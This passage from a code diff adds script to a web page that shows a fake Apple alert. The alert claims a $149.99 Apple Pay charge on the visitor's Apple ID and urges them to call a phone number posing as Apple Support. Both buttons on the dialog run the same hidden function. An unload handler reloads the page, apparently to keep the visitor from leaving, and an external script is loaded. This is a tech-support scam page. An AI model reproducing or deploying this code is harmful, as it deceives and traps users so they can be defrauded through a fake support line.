+            if (confirm("Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-833-316-0185 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+<script defer="" data-domain="iosmd.sire" src="js/script.js"></script>
+
+
+</body></html>
